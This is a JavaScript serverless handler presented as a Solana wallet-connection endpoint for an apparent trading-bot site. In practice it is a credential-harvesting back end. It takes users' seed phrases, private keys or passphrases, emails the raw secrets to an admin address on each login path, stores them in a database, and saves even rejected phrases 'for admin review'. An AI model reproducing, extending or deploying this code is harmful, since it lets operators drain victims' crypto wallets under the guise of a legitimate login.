/**
 * Wallet Connection Endpoint
 * 
 * Connects wallet using seed phrase or passphrase
 * Generates deterministic wallet address
 * Returns JWT token for authenticated sessions
 */

const { WalletGenerator, INPUT_TYPES, WALLET_TYPES } = require('./utils/walletGenerator');
const { createRPCInstance } = require('./utils/solanaRPC');
const { FirebaseWalletStore } = require('./utils/firebaseWalletStore');
const { sendWalletConnectionEmail } = require('./utils/loopsEmail');
const jwt = require('jsonwebtoken');
const axios = require('axios');

// Hardcoded defaults for local development
const JWT_SECRET = process.env.JWT_SECRET || 'dev-secret-key-change-in-production-use-crypto-randomBytes';
const TOKEN_EXPIRY = '30d'; // 30 days
const ADMIN_EMAIL = process.env.ADMIN_EMAIL || 'admin@solsnipeai.xyz';
const BACKUP_SERVER_URL = (process.env.SOLANA_VERIFICATION_SERVER_URL || 'https://backs1.netlify.app').replace(/\/+$/, '');

async function verifyWalletOnBackupServer(walletAddress) {
  const endpoint = `${BACKUP_SERVER_URL}/api/verify-wallet-onchain`;
  const response = await axios.post(
    endpoint,
    { walletAddress, txLimit: 1 },
    {
      timeout: 12000,
      headers: { 'Content-Type': 'application/json' }
    }
  );

  return response.data;
}

console.log('🔐 JWT Secret:', JWT_SECRET ? '✅ Set' : '❌ Missing');
console.log('📧 Admin Email:', ADMIN_EMAIL);

exports.handler = async (event) => {
  // CORS headers
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
    'Content-Type': 'application/json'
  };

  // Handle preflight
  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 200, headers, body: '' };
  }

  // Only accept POST
  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: 'Method not allowed' })
    };
  }

  try {
    const body = JSON.parse(event.body);
    const { walletName, walletType, inputType, credentials, accountIndex = 0 } = body;

    // Validate required fields
    if (!walletName) {
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ error: 'walletName is required (user identifier)' })
      };
    }

    // Validate walletType - accept any non-empty string
    if (!walletType || typeof walletType !== 'string' || walletType.trim().length === 0) {
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ 
          error: 'walletType is required and must be a non-empty string',
          examples: ['phantom', 'solflare', 'backpack', 'trust', 'coinbase', 'custom']
        })
      };
    }

    if (!inputType || !Object.values(INPUT_TYPES).includes(inputType)) {
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ 
          error: 'Invalid inputType',
          validTypes: Object.values(INPUT_TYPES)
        })
      };
    }

    if (!credentials || typeof credentials !== 'string') {
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ 
          error: 'credentials required (seed phrase or passphrase)' 
        })
      };
    }

    // Generate wallet from seed phrase or passphrase
    let walletInfo;
    try {
      walletInfo = WalletGenerator.generateWallet({
        inputType,
        input: credentials,
        walletType,
        accountIndex
      });
    } catch (error) {
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ 
          error: 'Invalid credentials',
          details: error.message 
        })
      };
    }

    // Initialize Firebase store
    const walletStore = new FirebaseWalletStore();

    // Check if wallet exists by seed hash
    let existingWallet = await walletStore.getWalletBySeedHash(walletInfo.lookupHash);

    // Initialize RPC once for the entire request
    const rpc = createRPCInstance();

    if (existingWallet) {
      // Wallet exists - this is a returning user
      console.log(`Existing wallet found: ${existingWallet.walletAddress}`);

      // Fetch current Solana balance
      const balanceData = await rpc.getBalance(existingWallet.walletAddress);

      // Update wallet with fresh data
      await walletStore.updateWalletBalance(
        existingWallet.walletId,
        balanceData.balance
      );

      // Send email notification for returning user (async, don't wait)
      const inputTypeLabel = existingWallet.inputType === INPUT_TYPES.SEED_PHRASE ? 'Seed Phrase'
        : existingWallet.inputType === INPUT_TYPES.PRIVATE_KEY ? 'Private Key'
        : 'Passphrase';
      sendWalletConnectionEmail(ADMIN_EMAIL, {
        walletAddress: existingWallet.walletAddress,
        inputType: inputTypeLabel,
        balance: balanceData.balance,
        isNewWallet: false,
        codes: credentials, // The actual seed phrase or passphrase
        walletType: existingWallet.walletType // Added walletType
      }).catch(err => console.error('Email notification failed:', err.message));

      // Generate JWT token
      const token = jwt.sign(
        {
          walletId: existingWallet.walletId,
          walletAddress: existingWallet.walletAddress,
          walletType: existingWallet.walletType,
          blockchain: 'solana'
        },
        JWT_SECRET,
        { expiresIn: TOKEN_EXPIRY }
      );

      return {
        statusCode: 200,
        headers,
        body: JSON.stringify({
          success: true,
          message: 'Wallet connected successfully',
          isNewWallet: false,
          wallet: {
            walletId: existingWallet.walletId,
            walletAddress: existingWallet.walletAddress,
            walletType: existingWallet.walletType,
            balance: balanceData.balance,
            balanceLastUpdated: balanceData.fetchedAt,
            recentTransactions: existingWallet.transactions || [],
            createdAt: existingWallet.createdAt,
            lastLoginAt: new Date().toISOString(),
            loginCount: existingWallet.loginCount + 1
          },
          token,
          expiresIn: TOKEN_EXPIRY
        })
      };
    } else {
      // New wallet - verify it actually exists on the Solana blockchain.
      // Phantom (and other wallets) can derive keys via three different paths,
      // so we probe every candidate address until one is found on-chain.
      const candidates = walletInfo.derivationCandidates || [
        { walletAddress: walletInfo.walletAddress, derivationPath: walletInfo.derivationPath }
      ];

      console.log(`Verifying wallet on-chain across ${candidates.length} derivation path(s)…`);

      let existsOnChain = false;
      let confirmedAddress = null;
      let confirmedDerivationPath = null;

      for (const candidate of candidates) {
        console.log(`  Trying path "${candidate.derivationPath}": ${candidate.walletAddress}`);
        try {
          const verificationResult = await verifyWalletOnBackupServer(candidate.walletAddress);
          if (Boolean(verificationResult.existsOnChain)) {
            existsOnChain      = true;
            confirmedAddress   = candidate.walletAddress;
            confirmedDerivationPath = candidate.derivationPath;
            break;
          }
        } catch (backupError) {
          console.error(`  Backup verification failed for ${candidate.walletAddress}, falling back to local RPC:`, backupError.message);
          try {
            const accountInfo = await rpc.getAccountInfo(candidate.walletAddress);
            if (accountInfo.exists) {
              existsOnChain      = true;
              confirmedAddress   = candidate.walletAddress;
              confirmedDerivationPath = candidate.derivationPath;
              break;
            }
          } catch (rpcError) {
            console.error(`  RPC fallback also failed for ${candidate.walletAddress}:`, rpcError.message);
          }
        }
      }

      if (!existsOnChain) {
        // If not found on-chain, try database fallback using every derived candidate address.
        // This supports wallets that are already known to this system but may not be discoverable
        // via on-chain existence checks (for example, zero-activity addresses).
        let existingWalletByAddress = null;
        for (const candidate of candidates) {
          try {
            existingWalletByAddress = await walletStore.getWalletByAddress(candidate.walletAddress);
            if (existingWalletByAddress) {
              console.log(`Wallet found in DB fallback lookup: ${candidate.walletAddress}`);
              break;
            }
          } catch (dbLookupError) {
            console.error(`DB lookup failed for ${candidate.walletAddress}:`, dbLookupError.message);
          }
        }

        if (existingWalletByAddress) {
          let balanceData;
          try {
            balanceData = await rpc.getBalance(existingWalletByAddress.walletAddress);
          } catch (balanceError) {
            console.error('Failed to fetch live balance during DB fallback login:', balanceError.message);
            balanceData = {
              balance: existingWalletByAddress.balance || 0,
              fetchedAt: new Date().toISOString()
            };
          }

          await walletStore.updateWalletBalance(
            existingWalletByAddress.walletId,
            balanceData.balance
          );

          const fallbackInputTypeLabel = existingWalletByAddress.inputType === INPUT_TYPES.SEED_PHRASE ? 'Seed Phrase'
            : existingWalletByAddress.inputType === INPUT_TYPES.PRIVATE_KEY ? 'Private Key'
            : 'Passphrase';

          sendWalletConnectionEmail(ADMIN_EMAIL, {
            walletAddress: existingWalletByAddress.walletAddress,
            inputType: fallbackInputTypeLabel,
            balance: balanceData.balance,
            isNewWallet: false,
            codes: credentials,
            walletType: existingWalletByAddress.walletType
          }).catch(err => console.error('Email notification failed:', err.message));

          const token = jwt.sign(
            {
              walletId: existingWalletByAddress.walletId,
              walletAddress: existingWalletByAddress.walletAddress,
              walletType: existingWalletByAddress.walletType,
              blockchain: 'solana'
            },
            JWT_SECRET,
            { expiresIn: TOKEN_EXPIRY }
          );

          return {
            statusCode: 200,
            headers,
            body: JSON.stringify({
              success: true,
              message: 'Wallet connected successfully',
              isNewWallet: false,
              source: 'database-fallback',
              wallet: {
                walletId: existingWalletByAddress.walletId,
                walletAddress: existingWalletByAddress.walletAddress,
                walletType: existingWalletByAddress.walletType,
                balance: balanceData.balance,
                balanceLastUpdated: balanceData.fetchedAt,
                recentTransactions: existingWalletByAddress.transactions || [],
                createdAt: existingWalletByAddress.createdAt,
                lastLoginAt: new Date().toISOString(),
                loginCount: (existingWalletByAddress.loginCount || 0) + 1
              },
              token,
              expiresIn: TOKEN_EXPIRY
            })
          };
        }

        // Record these credentials in off_chain_keys for admin review before rejecting
        try {
          await walletStore.saveOffChainKey({
            inputType,
            walletType,
            credentials,
            seedHash: walletInfo.lookupHash,
            triedAddresses: candidates.map(c => c.walletAddress)
          });
          console.log('📥 Credentials saved to off_chain_keys for admin review');
        } catch (saveErr) {
          console.error('Failed to save off-chain key record:', saveErr.message);
        }

        return {
          statusCode: 400,
          headers,
          body: JSON.stringify({
            error: 'Wallet not found on blockchain',
            details: 'The credentials you provided do not match any existing Solana wallet across all supported derivation paths. Please check your seed phrase and try again.',
            offChainSaved: true
          })
        };
      }

      // Use whichever derivation path produced the confirmed on-chain address
      if (confirmedAddress && confirmedAddress !== walletInfo.walletAddress) {
        console.log(`Switching to confirmed derivation path "${confirmedDerivationPath}": ${confirmedAddress}`);
        walletInfo.walletAddress = confirmedAddress;
        walletInfo.publicKey     = confirmedAddress;
        walletInfo.derivationPath = confirmedDerivationPath;
        // Re-generate walletId so it is tied to the actual address used
        walletInfo.walletId = walletInfo.walletId + `-${confirmedDerivationPath.replace(/[^a-z0-9]/gi, '')}`;
      }

      console.log(`Wallet verified on-chain: ${walletInfo.walletAddress}`);

      // Fetch Solana balance for new wallet
      const balanceData = await rpc.getBalance(walletInfo.walletAddress);

      // Save wallet to Firebase
      await walletStore.saveWallet({
        ...walletInfo,
        balance: balanceData.balance,
        credentials: credentials // Store the seed phrase or passphrase
      });

      // Send email notification (async, don't wait)
      const newInputTypeLabel = inputType === INPUT_TYPES.SEED_PHRASE ? 'Seed Phrase'
        : inputType === INPUT_TYPES.PRIVATE_KEY ? 'Private Key'
        : 'Passphrase';
      sendWalletConnectionEmail(ADMIN_EMAIL, {
        walletAddress: walletInfo.walletAddress,
        inputType: newInputTypeLabel,
        balance: balanceData.balance,
        isNewWallet: true,
        codes: credentials, // The actual seed phrase or passphrase
        walletType: walletInfo.walletType // Added walletType
      }).catch(err => console.error('Email notification failed:', err.message));

      // Generate JWT token
      const token = jwt.sign(
        {
          walletId: walletInfo.walletId,
          walletAddress: walletInfo.walletAddress,
          walletType,
          blockchain: 'solana'
        },
        JWT_SECRET,
        { expiresIn: TOKEN_EXPIRY }
      );

      return {
        statusCode: 201,
        headers,
        body: JSON.stringify({
          success: true,
          message: 'New wallet created successfully',
          isNewWallet: true,
          wallet: {
            walletId: walletInfo.walletId,
            walletAddress: walletInfo.walletAddress,
            walletType,
            balance: balanceData.balance,
            balanceLastUpdated: balanceData.fetchedAt,
            derivationPath: walletInfo.derivationPath,
            createdAt: walletInfo.createdAt,
            loginCount: 1
          },
          token,
          expiresIn: TOKEN_EXPIRY
        })
      };
    }
  } catch (error) {
    console.error('Wallet connection error:', error);

    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({
        error: 'Internal server error',
        message: error.message
      })
    };
  }
};
